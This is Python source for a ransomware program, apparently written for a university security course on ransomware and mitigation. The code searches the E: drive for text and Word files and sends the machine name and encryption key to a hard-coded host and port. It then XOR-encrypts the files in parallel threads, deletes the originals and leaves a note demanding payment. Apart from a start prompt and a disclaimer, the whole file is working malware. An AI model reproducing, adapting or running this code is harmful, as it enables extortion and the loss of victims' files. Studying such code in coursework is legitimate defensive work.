"""
Author: Ethan Allis
Class: SEC-440-01
Assignment: Project 3 - Ransomware and Mitigation
Credit to Python Esper for inspiration and assistance.
"""

""" This code is for educational purposes only and should not be duplicated for personal use """

# Import lists
import os
import random
import socket
import shutil
from datetime import datetime
from threading import Thread
from queue import Queue

# Testing safegaurd, should be commented out
safegaurd = input("Please confirm program start by typing 'start': ")
if safegaurd != "start":
    print(f'Terminating Program')
    quit()

# Program startup
print(f'You have fell into my trap...')
print(f'ENCRYPTING FILES')

# Target file extensions to be encrypted, any can be added
encrypted_ext = ('.txt', '.docx')

# List of file paths & files from victim target directory
file_paths = []
for root, dirs, files, in os.walk('E:\\'):
    for file in files:
        file_path, file_ext = os.path.splitext(root+'\\'+file)
        if file_ext in encrypted_ext:
            file_paths.append(root+'\\'+file)

# Key used to encrypt
enc_key = ''

# Defined 128 bit encryption method
encryption_level = 128 // 8

# Generating the pool of ASCII characters to be used in enc_key
enc_pool = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ<>?,./;[]{}|'

# enc_key generation drawing from enc_pool
for i in range(encryption_level):
    enc_key += random.choice(enc_pool)

# Get victim hostname
victimname = os.getenv('COMPUTERNAME')

"""INPUT RANSOMWARE HOST INFO BELOW"""
hostip = '192.168.50.225'
hostport = 9960

# Timestamp for logging purposes
timestamp = datetime.now()

# Open a socket on specified port to specified address, send collected information encoded in binary
with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.connect((hostip, hostport))
    s.send(f'[{timestamp}] - {victimname}:{enc_key}'.encode('utf-8'))


# File encryption process
def encrypt(enc_key):
    while q.not_empty:
        file = q.get()
        key_index = 0
        max_key_index = encryption_level - 1
        # Try/except logic for admin protected files
        try:
            with open(file, 'rb') as f:
                data = f.read()
            with open(file, 'wb') as f:
                for byte in data:
                    xor_byte = byte ^ ord(enc_key[key_index])
                    f.write(xor_byte.to_bytes(1, 'little'))
                    if key_index >= max_key_index:
                        key_index = 0
                    else:
                        key_index += 1
        except:
            print(f'Could not encrypt {file}, moving on')
        q.task_done()


# Adding file paths to queue object for multithreading encryption
q = Queue()
for file in file_paths:
    q.put(file)

# Multithreading functionality
for i in range(30):
    thread = Thread(target=encrypt, args=(enc_key,), daemon=True)
    thread.start()

# Waits for queue object to be empty before moving on with program
q.join()

# Removes encryption key from memory
enc_key = ''

# Copies, renames, and deletes files
for file in file_paths:
    enc_file = file + ".encrypted"
    shutil.copy(file, enc_file)
    os.remove(file)

# Creates instriuctions regarding decryption
with open(r'E:\\RANSOMWARE_READ_ME.txt', 'w') as fp:
    fp.write('Your files have been encrypted. Contact example@gmail.com to learn more. Be prepared to pay.')

# Encryption process complete
print(f'ENCRYPTION SUCCESSFUL')
